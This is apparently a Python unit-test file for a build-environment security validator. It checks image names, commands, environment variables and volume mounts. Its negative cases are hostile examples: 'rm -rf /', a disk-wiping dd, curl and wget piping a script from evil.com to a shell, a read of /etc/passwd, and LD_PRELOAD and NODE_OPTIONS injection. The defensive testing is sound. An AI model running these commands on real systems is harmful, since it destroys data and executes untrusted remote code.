#!/usr/bin/env python3
"""Tests for the build-env security validation module."""

import unittest
from unittest.mock import Mock, patch

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from security import SecurityValidation


class TestSecurityValidation(unittest.TestCase):
    """Test cases for security validation functionality."""

    def test_validate_image_name_valid(self):
        """Test that valid image names pass validation."""
        validator = SecurityValidation()

        # Valid image names
        valid_images = [
            "ubuntu:20.04",
            "python:3.9",
            "node:16-alpine",
            "golang:1.19",
            "alpine:latest"
        ]

        for image in valid_images:
            with self.subTest(image=image):
                self.assertTrue(validator.validate_image_name(image))

    def test_validate_image_name_invalid(self):
        """Test that invalid image names fail validation."""
        validator = SecurityValidation()

        # Invalid image names
        invalid_images = [
            "../../malicious",  # Path traversal
            "http://evil.com/image",  # URL
            "file:///etc/passwd",  # File URL
            "image with spaces",  # Spaces
            "image\twith\ttabs",  # Tabs
            "image\nwith\nnewlines",  # Newlines
            ""  # Empty string
        ]

        for image in invalid_images:
            with self.subTest(image=image):
                self.assertFalse(validator.validate_image_name(image))

    def test_validate_command_safe(self):
        """Test that safe commands pass validation."""
        validator = SecurityValidation()

        safe_commands = [
            ["ls", "-la"],
            ["npm", "install"],
            ["python", "setup.py", "install"],
            ["go", "build", "./..."],
            ["make", "test"]
        ]

        for cmd in safe_commands:
            with self.subTest(cmd=cmd):
                self.assertTrue(validator.validate_command(cmd))

    def test_validate_command_dangerous(self):
        """Test that dangerous commands fail validation."""
        validator = SecurityValidation()

        dangerous_commands = [
            ["rm", "-rf", "/"],  # Dangerous rm
            ["dd", "if=/dev/zero", "of=/dev/sda"],  # Disk destruction
            ["chmod", "777", "/etc"],  # Permission escalation
            ["wget", "http://evil.com/script.sh", "-O-", "|", "sh"],  # Pipe to shell
            ["curl", "http://evil.com/script.sh", "|", "bash"]  # Pipe to bash
        ]

        for cmd in dangerous_commands:
            with self.subTest(cmd=cmd):
                self.assertFalse(validator.validate_command(cmd))

    def test_validate_environment_variables_safe(self):
        """Test that safe environment variables pass validation."""
        validator = SecurityValidation()

        safe_env = {
            "PATH": "/usr/local/bin:/usr/bin:/bin",
            "HOME": "/home/user",
            "LANG": "en_US.UTF-8",
            "NODE_ENV": "production"
        }

        self.assertTrue(validator.validate_environment_variables(safe_env))

    def test_validate_environment_variables_dangerous(self):
        """Test that dangerous environment variables fail validation."""
        validator = SecurityValidation()

        dangerous_env = {
            "PATH": "/evil/bin:/usr/bin",  # Modified PATH
            "LD_PRELOAD": "/evil/lib.so",  # Library injection
            "PYTHONSTARTUP": "/evil/script.py",  # Python injection
            "NODE_OPTIONS": "--require /evil/module.js"  # Node injection
        }

        self.assertFalse(validator.validate_environment_variables(dangerous_env))

    def test_validate_volumes_safe(self):
        """Test that safe volume mounts pass validation."""
        validator = SecurityValidation()

        safe_volumes = {
            "/app": "/host/app",
            "/data": "/host/data",
            "/tmp": "/host/tmp"
        }

        self.assertTrue(validator.validate_volumes(safe_volumes))

    def test_validate_volumes_dangerous(self):
        """Test that dangerous volume mounts fail validation."""
        validator = SecurityValidation()

        dangerous_volumes = {
            "/etc": "/host/etc",  # System configuration
            "/root": "/host/root",  # Root home
            "/proc": "/host/proc",  # Process filesystem
            "/sys": "/host/sys",  # System filesystem
            "/dev": "/host/dev"  # Device files
        }

        self.assertFalse(validator.validate_volumes(dangerous_volumes))


if __name__ == "__main__":
    unittest.main()